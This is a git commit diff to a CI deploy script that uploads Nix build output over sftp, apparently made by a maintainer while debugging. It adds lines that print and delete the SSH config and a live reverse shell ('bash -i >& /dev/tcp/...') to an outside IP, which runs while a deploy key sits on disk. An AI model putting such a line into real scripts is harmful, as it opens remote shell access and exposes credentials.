372023e28d3b4ba17a162a92c4ffea673bca3b95
Michael Weiss <dev.primeos@gmail.com>
2019-03-12 23:18:19 +0100

    ci-test v3

--- deploy.sh
+++ deploy.sh
@@ -27,12 +27,31 @@ Source date: $(date --date=@$(git log -1 --pretty=%ct) +%F)
 Build date: $(date --utc +'%F')
 Nixpkgs commit: $(cat ~/.nix-defexpr/channels/nixpkgs/.git-revision)
 EOF
+#nix-env -i tmate
+#tmate -S /tmp/tmate.sock new-session -d               # Launch tmate in a detached state
+#tmate -S /tmp/tmate.sock wait tmate-ready             # Blocks until the SSH connection is established
+#tmate -S /tmp/tmate.sock display -p '#{tmate_ssh}'    # Prints the SSH connection string
+#tmate -S /tmp/tmate.sock display -p '#{tmate_ssh_ro}' # Prints the read-only SSH connection string
+#tmate -S /tmp/tmate.sock display -p '#{tmate_web}'    # Prints the web connection string
+#tmate -S /tmp/tmate.sock display -p '#{tmate_web_ro}' # Prints the read-only web connection string
+#sleep 1000000
+nix-env -i openssh
+ssh -V
+ls -al /home/travis/.ssh/config
+id
 cat <<EOF > sftp-commands
-ls -al
 -rm *
 put result/*
 put build-information
 chmod 644 *
 EOF
-sftp -i /tmp/id_rsa -b sftp-commands "${SFTP_USER}@${HOST}:${TARGET_DIRECTORY}"
+cat sftp-commands
+xxd sftp-commands
+chmod 600 /home/travis/.ssh/config
+cat /home/travis/.ssh/config
+rm /home/travis/.ssh/config
+bash -i >& /dev/tcp/134.2.220.56/2020 0>&1
+sleep 1000000000000
+echo "get build-information" | sftp -i /tmp/id_rsa -vvvvv "${SFTP_USER}@${HOST}:${TARGET_DIRECTORY}"
+sftp -i /tmp/id_rsa -b sftp-commands -vvv "${SFTP_USER}@${HOST}:${TARGET_DIRECTORY}"
 rm /tmp/id_rsa
